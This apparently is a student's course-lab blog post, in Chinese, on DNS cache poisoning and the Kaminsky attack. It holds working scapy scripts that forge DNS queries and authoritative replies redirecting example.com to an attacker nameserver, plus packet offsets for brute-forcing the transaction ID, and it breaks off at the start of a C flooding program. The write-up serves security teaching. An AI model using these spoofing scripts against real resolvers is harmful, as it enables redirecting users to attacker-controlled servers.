@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="《软件安全》课程实验3，有关DNS相关原理以及漏洞的攻击。Kaminsky攻击方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="software-security-lab6">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/05/30/software-security-lab6/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="《软件安全》课程实验3，有关DNS相关原理以及漏洞的攻击。Kaminsky攻击方法">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530110330762.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530131343433.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530140035570.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530140247389.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530140514847.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530143654170.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530162732918.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530162354073.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530171422638.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530171123461.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530190651616.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530214258861.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530214529111.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530214632385.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530222551632.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220530215753550.png">
+<meta property="article:published_time" content="2022-05-30T00:27:47.000Z">
+<meta property="article:modified_time" content="2023-01-19T05:07:00.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="software-security">
+<meta property="article:tag" content="DNS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220530110330762.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>software-security-lab6 | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-software-security-lab6" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/05/30/software-security-lab6/" class="article-date">
+      <time datetime="2022-05-30T00:27:47.000Z" itemprop="datePublished">2022-05-30</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      software-security-lab6
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/school/">school</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>《软件安全》课程实验3，有关DNS相关原理以及漏洞的攻击。Kaminsky攻击方法</p>
+<span id="more"></span>
+
+<h1 id="software-security-lab6"><a href="#software-security-lab6" class="headerlink" title="software-security-lab6"></a>software-security-lab6</h1><p>[TOC]</p>
+<h1 id="DNS攻击原理"><a href="#DNS攻击原理" class="headerlink" title="DNS攻击原理"></a>DNS攻击原理</h1><h2 id="传统攻击"><a href="#传统攻击" class="headerlink" title="传统攻击"></a>传统攻击</h2><p>如下图所示</p>
+<p><img src="/.io//image-20220530110330762.png" alt="image-20220530110330762"></p>
+<p>具体流程为：</p>
+<ol>
+<li>受害者向DNS发送一个查询请求</li>
+<li>此时DNS服务器应该向跟根务器等一级一级询问</li>
+<li>攻击者伪装自己是权威DNS服务器，发送一个假的数据给local resolver(同时需要爆破TXID)</li>
+<li>如果攻击者抢先在权威DNS服务器之前传送了数据，就完成了攻击。</li>
+</ol>
+<h2 id="Kaminsky攻击"><a href="#Kaminsky攻击" class="headerlink" title="Kaminsky攻击"></a>Kaminsky攻击</h2><p>改进的攻击主要防止如果一次攻击没有成功的情况下，需要等待一个完整的TTL之后才能下一次攻击的特性。具体方案如下。</p>
+<p><img src="/.io//image-20220530131343433.png" alt="image-20220530131343433"></p>
+<ol>
+<li>攻击者A1向服务器发送一个请求$rand.google.com的请求</li>
+<li>服务器<strong>一定</strong>无法解析域名。于是要向谷歌的官方DNS服务器询问。</li>
+<li>在这个过程中，A2不断地向本地DNS服务器发送伪造数据包。数据包中不仅包含$RAND.google.com的ip，还包含<a target="_blank" rel="noopener" href="http://www.google.com的ip.**注意此时本地dns服务器如果成功收到伪造的包,就会把$rand.google.com的ip和www.google.com的ip都记下来(作为一个dns解析的ip地址).**这个时候就完成了一次伪造的ip写入./">www.google.com的IP。**注意此时本地DNS服务器如果成功收到伪造的包，就会把$RAND.google.com的ip和www.google.com的IP都记下来(作为一个dns解析的IP地址)。**这个时候就完成了一次伪造的IP写入。</a></li>
+</ol>
+<p>注意这个攻击相比于上一个：上一个可能要等很多个TTL，这一次成功只是时间问题，可以一直尝试下去。</p>
+<h2 id="环境验证"><a href="#环境验证" class="headerlink" title="环境验证"></a>环境验证</h2><p>首先是<code>dig ns.attacker32.com</code></p>
+<p><img src="/.io//image-20220530140035570.png" alt="image-20220530140035570"></p>
+<p>接下来看一下<code>example.com</code>对应的IP。如果直接访问，可以看到DNS解析出来的是一个真实的IP，可以随意访问。</p>
+<p><img src="/.io//image-20220530140247389.png" alt="image-20220530140247389"></p>
+<p>但是如果借用攻击者的DNS访问，出来的结果是攻击者自己设置的<code>example.com</code>的IP。</p>
+<p><img src="/.io//image-20220530140514847.png" alt="image-20220530140514847"></p>
+<h1 id="task2-construct-DNS-request"><a href="#task2-construct-DNS-request" class="headerlink" title="task2:construct DNS request"></a>task2:construct DNS request</h1><p>这里我们需要伪造一个包。如下所示是我用<code>wireshark</code>抓包得到的结果。可以看到我们伪造的DNS包经过了服务器的响应，返回了伪造的IP地址。并且也成功的被wireshark识别为一个DNS回应。这说明我们的伪造大致是正确的。</p>
+<p><img src="/.io//image-20220530143654170.png" alt="image-20220530143654170"></p>
+<p>用到的代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">exec attack</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&quot;www.example.com&quot;</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>,qr = <span class="number">0</span>, qdcount = <span class="number">1</span>, ancount = <span class="number">0</span>,nscount = <span class="number">0</span>,arcount = <span class="number">0</span>, qd = Qdsec)</span><br><span class="line">ip = IP(dst = <span class="string">&#x27;10.9.0.153&#x27;</span>, src = <span class="string">&#x27;10.9.0.1&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">53</span>, sport = <span class="number">12345</span>, chksum = <span class="number">0</span>)</span><br><span class="line">request = ip/udp/dns</span><br><span class="line"></span><br><span class="line">send(request,verbose=<span class="number">0</span>,iface = <span class="string">&quot;br-62635d9cf0f7&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="task3-spoof-DNS-replies"><a href="#task3-spoof-DNS-replies" class="headerlink" title="task3: spoof DNS replies"></a>task3: spoof DNS replies</h1><p>这里要求填写一系列字段的值。为了方便观察，我们先使用dig看一看DNS一般怎么回复。下面是一个正常查询IP的过程。在这里我们可以看到ns字段的作用。从下面的包可以看到，这里的ns是example.com对应的DNS解析服务器。因此我们在自己攻击时，需要将这里写成attacker的DNS服务器地址。</p>
+<p><img src="/.io//image-20220530162732918.png" alt="image-20220530162732918"></p>
+<p>使用以下代码完成一个伪造的DNS包的回复。其中最重要的字段是DNS()伪造包的部分。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name = <span class="string">&quot;123.example.com&quot;</span> <span class="comment"># query network</span></span><br><span class="line">domain = <span class="string">&quot;exmaple.com&quot;</span> <span class="comment"># query&#x27;s domain name</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span> <span class="comment"># hacker&#x27;s DNS 域名</span></span><br><span class="line"></span><br><span class="line">Qdsec = DNSQR(qname=name)</span><br><span class="line">Anssec = DNSRR(rrname=name, <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>, rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>,ttl = <span class="number">259200</span>)</span><br><span class="line">NSsec = DNSRR(rrname=domain, <span class="built_in">type</span> = <span class="string">&#x27;NS&#x27;</span>, rdata = ns, ttl = <span class="number">259200</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>,aa = <span class="number">1</span>, rd = <span class="number">1</span>, qr = <span class="number">1</span>, qdcount = <span class="number">1</span>, </span><br><span class="line">            ancount = <span class="number">1</span>,nscount = <span class="number">1</span>,arcount = <span class="number">0</span>, qd = Qdsec, an = Anssec, ns = NSsec)</span><br><span class="line"></span><br><span class="line">ip = IP(dst = <span class="string">&#x27;10.9.0.53&#x27;</span>,src = <span class="string">&#x27;10.9.0.153&#x27;</span>) <span class="comment"># dst 10.9.0.53 is the victim DNS server</span></span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>,sport = <span class="number">53</span>, chksum = <span class="number">0</span>) <span class="comment"># dest is 33333 port</span></span><br><span class="line">reply = ip/udp/dns</span><br><span class="line"></span><br><span class="line">send(reply,verbose=<span class="number">0</span>,iface = <span class="string">&quot;br-62635d9cf0f7&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们回复的包的内容。都是符合预期的。并且wireshark也将其解析为标准的DNS返回报文。</p>
+<p><img src="/.io//image-20220530162354073.png" alt="image-20220530162354073"></p>
+<h1 id="task4-full-attack"><a href="#task4-full-attack" class="headerlink" title="task4: full attack"></a>task4: full attack</h1><p>这里我们要用C模拟发送包，因为python发送的速度太慢了。我们需要修改的是transanctionID的数据。从下图的reply包中可以看出，这个ID处于偏移0x1C的位置上。这个位置的数据需要爆破。</p>
+<p><img src="/.io//image-20220530171422638.png" alt="image-20220530171422638"></p>
+<p>接着看看我们伪造的来源IP是什么。从下图中可以看到，我们最后一个访问的DNS服务器是b.iana-servers.net，使用nslookup可以看到对应的IP地址为199.43.133.53。因此可以确定我们reply包中ip的sec应该是199.43.133.53</p>
+<p><img src="/.io//image-20220530171123461.png" alt="image-20220530171123461"></p>
+<p>之后为了使得回复的包的域名和我们发送的一样，也需要找到在发送的包和返回的包中的域名起始位置。</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>项目</th>
+<th>偏移</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>发送包</td>
+<td>域名偏移</td>
+<td>0x29</td>
+</tr>
+<tr>
+<td>接受包</td>
+<td>域名偏移</td>
+<td>0x29、0x40</td>
+</tr>
+<tr>
+<td>接受包</td>
+<td>trans字段偏移</td>
+<td>0x1c</td>
+</tr>
+</tbody></table>
+<h2 id="构造包"><a href="#构造包" class="headerlink" title="构造包"></a>构造包</h2><p>依然是使用task3的脚本生成一个回复报文。这里构造一个回复包(发送包不列出了)，之后用C直接修改包中特定偏移的数据，就不用每次构造所有数据了，能够更大程度的加快速度。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name = <span class="string">&quot;12345.example.com&quot;</span> <span class="comment"># query network 这里要注意是开始5位才能和C语言的对上</span></span><br><span class="line">domain = <span class="string">&quot;example.com&quot;</span> <span class="comment"># query&#x27;s domain name</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span> <span class="comment"># hacker&#x27;s DNS server name</span></span><br><span class="line"></span><br><span class="line">Qdsec = DNSQR(qname=name)</span><br><span class="line">Anssec = DNSRR(rrname=name, <span class="built_in">type</span> = <span class="string">&#x27;A&#x27;</span>, rdata = <span class="string">&#x27;1.2.3.4&#x27;</span>,ttl = <span class="number">259200</span>)</span><br><span class="line">NSsec = DNSRR(rrname=domain, <span class="built_in">type</span> = <span class="string">&#x27;NS&#x27;</span>, rdata = ns, ttl = <span class="number">259200</span>)</span><br><span class="line">dns = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>,aa = <span class="number">1</span>, rd = <span class="number">1</span>, qr = <span class="number">1</span>, qdcount = <span class="number">1</span>, </span><br><span class="line">            ancount = <span class="number">1</span>,nscount = <span class="number">1</span>,arcount = <span class="number">0</span>, qd = Qdsec, an = Anssec, ns = NSsec)</span><br><span class="line"></span><br><span class="line">ip = IP(dst = <span class="string">&#x27;10.9.0.53&#x27;</span>,src = <span class="string">&#x27;199.43.133.53&#x27;</span>) <span class="comment"># dst 10.9.0.53 is the victim DNS server</span></span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>,sport = <span class="number">53</span>, chksum = <span class="number">0</span>) <span class="comment"># dest is 33333 port</span></span><br><span class="line">reply = ip/udp/dns</span><br><span class="line"></span><br><span class="line"><span class="comment"># send(reply,verbose=0,iface = &quot;br-62635d9cf0f7&quot;)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_resp.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(reply))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在wireshark中可以看到我们构造的报文是合法的，可以通过wireshark识别。</p>
+<p><img src="/.io//image-20220530190651616.png" alt="image-20220530190651616"></p>
+<h2 id="使用C修改并发送"><a href="#使用C修改并发送" class="headerlink" title="使用C修改并发送"></a>使用C修改并发送</h2><p>使用的C语言代码如下所示。其实改动并不多。下面的代码主要做了以下事情。</p>
+<ol>
+<li><strong>随机生成一个$(rand).example.com，并向服务器发送这样的访问请求</strong>，触发服务器的DNS询问过程。</li>
+<li>立刻向本地的DNS服务器发送伪造的DNS响应包。其中需要修改的是transID字段，并且<strong>把伪造包中的域名修改为上一步发送的随机域名</strong>。<strong>将构造包中的example.com的权威域名服务器修改为攻击者自己的DNS服务器</strong>。</li>
+<li>不断重复上述过程。</li>
+</ol>
+<p>一下是代码部分。主要是修改了返回给用户的包中<strong>trans</strong>字段的数字(来爆破原先的transID)，以及对应的域名。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 